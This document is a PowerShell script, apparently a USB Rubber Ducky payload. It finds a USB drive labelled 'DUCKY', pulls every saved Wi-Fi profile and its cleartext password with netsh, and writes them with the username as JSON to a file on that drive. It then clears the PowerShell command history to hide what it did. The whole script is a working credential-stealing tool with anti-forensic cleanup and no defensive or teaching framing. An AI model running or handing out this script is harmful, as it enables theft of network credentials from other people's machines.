# Define the volume label you're looking for
$targetLabel = "DUCKY"

# Find the drive letter of the USB drive with the specified label
$volume = Get-Volume | Where-Object { $_.FileSystemLabel -eq $targetLabel }

if ($volume) {
    $driveLetter = $volume.DriveLetter + ":\"
    $usbPath = "$driveLetter$env:username.txt"
    $baseDestinationDir = $driveLetter
    Write-Output "Drive letter found: $driveLetter"
} else {
    Write-Error "Drive with label '$targetLabel' not found."
    exit
}

# Initialize an array to store all Wi-Fi profiles and their passwords
$wifiData = @()

# Get all Wi-Fi profiles
$profiles = netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+'

foreach ($profile in $profiles) {
    $wlan = $profile.Matches.Value.Trim()

    # Get the password for the current Wi-Fi profile
    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
    $password = if ($passw) { $passw.Matches.Value.Trim() } else { "No Password Found" }

    # Create a custom object with the profile and password information
    $wifiData += [PSCustomObject]@{
        Username = $env:username
        Profile  = $wlan
        Password = $password
    }
}

# Convert the array of Wi-Fi data to JSON
$jsonBody = $wifiData | ConvertTo-Json -Depth 3

# Save the JSON data to a file on the USB drive
$jsonBody | Out-File -FilePath $usbPath -Encoding UTF8



# Clear the PowerShell command history
Clear-History

exit
